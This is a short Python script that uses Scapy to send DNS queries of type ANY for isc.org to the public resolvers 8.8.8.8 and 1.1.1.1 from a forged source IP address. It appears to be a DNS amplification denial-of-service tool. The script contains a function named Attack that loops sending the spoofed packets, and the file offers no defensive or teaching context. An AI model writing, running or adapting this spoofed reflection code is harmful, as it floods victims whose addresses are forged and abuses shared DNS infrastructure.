from scapy.all import IP, UDP, send, Raw
from faker import Faker
import random

dnsServers = ["8.8.8.8", "1.1.1.1"]
fake = Faker()

dns_query = (
    b'\xab\xcd'           # Transaction ID
    b'\x01\x20'           # Flags: RD
    b'\x00\x01'           # Questions: 1
    b'\x00\x00'           # Answer RRs: 0
    b'\x00\x00'           # Authority RRs: 0
    b'\x00\x00'           # Additional RRs: 0
    b'\x03isc\x03org\x00' # Query: isc.org (3isc, 3org, 0)
    b'\x00\xff'           # QTYPE: ANY
    b'\x00\x01'           # QCLASS: IN
)
def Attack(requestPerServer):
    src_ip = fake.ipv4()
    for address in dnsServers:
        ip = IP(src=src_ip, dst=address)
        for i in range(requestPerServer):
            src_port = random.randint(1024, 65535)
            udp = UDP(sport=src_port, dport=53)
            packet = ip/udp/Raw(load= dns_query)
            send(packet, verbose=False)
            print(f"{i} packets sent")
    pass
